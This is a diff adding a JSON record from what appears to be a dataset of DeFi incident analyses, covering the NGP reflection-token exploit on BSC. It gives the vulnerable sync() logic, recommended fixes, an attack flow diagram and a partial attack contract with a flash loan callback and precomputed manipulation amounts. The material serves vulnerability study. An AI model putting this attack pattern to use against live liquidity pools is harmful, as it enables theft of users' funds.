@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-09-24_NGP_ReflectionToken-Manipulation",
+ "source_file": "2025/2025-09-24_NGP_ReflectionToken-Manipulation.md",
+ "title": "NGP — Reflection Token Mechanism Manipulation Analysis",
+ "date": "2025-09-24",
+ "protocol": "NGP Token",
+ "chain": "BSC",
+ "loss_raw": "~2,000,000 USDT",
+ "loss_usd": null,
+ "root_cause": "Manipulation of `sync()` trigger conditions inside NGP token's `_update()`, drastically distorting pair price",
+ "attack_tx": "0xc2066e0d...",
+ "vulnerable_contract": "0xd2f26200cd524db097cf4ab7cc2e5c38ab6ae5c9",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: sync() trigger condition inside _update() is manipulable\nfunction _update(address from, address to, uint256 amount) internal override {\n    // Calls pair.sync() under specific conditions\n    // These conditions can be triggered by specific balance values\n    if (shouldSync(from, to, amount)) {\n        IPancakePair(pair).sync(); // ← Force-updates reserves to current balance\n    }\n    super._update(from, to, amount);\n}\n\n// sync() updates reserves based on current token balance\n// If the attacker manipulates the pair's NGP balance, reserves become distorted\n\n//",
+  "// File: contracts/Token.sol\n\nfunction _transfer(address from, address to, uint256 value) internal {\n    if (from == address(0)) {\n        revert ERC20InvalidSender(address(0));\n    }\n    if (to == address(0)) {\n        revert ERC20InvalidReceiver(address(0));\n    }\n    _update(from, to, value);\n}\n\nfunction _update(\n    address from,\n    address to,\n    uint256 value\n) internal override {\n    require(value > 0, \"Invalid value\");\n\n    // Whitelisted addresses bypass all fee/sync logic\n    if (whitelisted[from] || whitelisted[to]) {\n        super._update(from, to, value);\n        emit SystemTransfer(from, to, value);\n        return;\n    }\n\n    // buy or remove liquidity\n    if (from == mainPair) {\n        require(buyState, \"Buy not allowed\");\n        require(\n            ((value * getPrice()) / 1e18) <= maxBuyAmountInUsdt,\n            \"Exceeds max buy amount\"\n        );\n        _checkAndUpdateBuyCount(to);\n        emit FlowOutPool(from, to, value);\n        super._update(from, to, value);\n        return;\n    }\n\n    // sell or add liquidity — THIS PATH CONTAINS THE VULNERABILITY\n    if (to == mainPair) {\n        require(sellState, \"Sell not allowed\");\n        _checkTransferCooldown(from);\n\n        uint256 marketFee = (value * marketFeeRate) / RATIO_PRECISION;\n        uint256 burnAmount = (value * burnFeeRate) / RATIO_PRECISION;\n        if (!isLpStopBurn()) {\n            super._update(from, DEAD, burnAmount);\n        } else {\n            super._update(from, marketAddress, burnAmount);\n        }\n        super._update(from, marketAddress, marketFee);\n        uint256 totalFee = marketFee + burnAmount;\n        uint256 treasuryAmount = (value * treasuryRate) / RATIO_PRECISION;\n        uint256 rewardAmount = (value * rewardRate) / RATIO_PRECISION;\n        uint256 burnPoolAmount = treasuryAmount + rewardAmount;\n        uint poolAmount = this.balanceOf(mainPair);\n        if (poolAmount > burnPoolAmount) {\n            // ❌ Withdraws tokens from the pair directly, then calls sync()\n            // This reduces the pair's NGP balance (actual balance < reserve)\n            super._update(mainPair, treasuryAddress, treasuryAmount);   // ❌ pulls from pair\n            super._update(mainPair, rewardPoolAddress, rewardAmount);    // ❌ pulls from pair\n            IUniswapV2Pair(mainPair).sync(); // ❌ syncs reserve DOWN to reduced actual balance\n            // After sync: reserve_NGP drops sharply → NGP appears scarcer → price spikes\n        }\n        value = value - totalFee;\n        emit FlowIntoPool(\n            from, to, value,\n            marketFee, burnAmount, treasuryAmount, rewardAmount\n        );\n    }\n\n    // check transfer cooldown for wallet-to-wallet\n    if (from != mainPair && to != mainPair) {\n        _checkTransferCooldown(from);\n    }\n\n    super._update(from, to, value);\n}"
+ ],
+ "code_after": [
+  "✅ Recommended fix: design sync trigger conditions carefully\n// sync() must not be triggered by externally manipulable conditions",
+  "// ✅ Fix: do not transfer tokens directly from the pair or call sync() within the token's _update() hook.\n// Treasury/reward distributions should be taken from the seller's amount BEFORE it reaches the pair,\n// not extracted from the pair's balance post-transfer. Remove the sync() call entirely."
+ ],
+ "steps": [
+  "→ Pair's NGP reserve drastically reduced (ratio distorted)",
+  "[4] ▶ Swap NGP → USDT using distorted reserves"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Flash loan 211,000,000 NGP (mockFlashloanProvider)\n  │\n  ├─[2]─▶ Transfer 1,350,000 NGP to deadAddress (preparation)\n  │         └─ Sets up sync() trigger condition inside _update()\n  │\n  ├─[3]─▶ Transfer large amount of flash-loaned NGP directly to pair\n  │         └─ _update() calls pair.sync()\n  │             → Pair's NGP reserve drastically reduced (ratio distorted)\n  │\n  ├─[4]─▶ Swap NGP → USDT using distorted reserves\n  │         └─ Receive large amount of USDT at extremely favorable ratio\n  │\n  └─[5]─▶ Repay flash loan + retain ~2,000,000 USDT profit",
+  "// Pre-calculated magic values:\n// (1) Flash loan amount required to trigger sync()\nuint256 public FLASHLOAN_AMOUNT = 211_000_000 * 10 ** 18;\n// (2) Preparation amount to maximally reduce pair's NGP balance\nuint256 public PREPARATION_NGP_AMOUNT = 1_350_000 * 10 ** 18;\n\nfunction flashloanCallback() public {\n    // [1] Preparation: transfer NGP to deadAddress\n    // → Satisfy sync trigger condition inside _update()\n    ngpToken.transfer(deadAddress, PREPARATION_NGP_AMOUNT);\n\n    // [2] Transfer large amount of NGP directly to pair\n    // → Triggers _update() → triggers pair.sync()\n    // → Pair NGP reserve updated to current (now low) balance\n    ngpToken.transfer(pair, FLASHLOAN_AMOUNT - PREPARATION_NGP_AMOUNT);\n\n    // [3] Swap NGP → USDT against distorted reserve state\n    // → In k = x *"
+ ]
+}
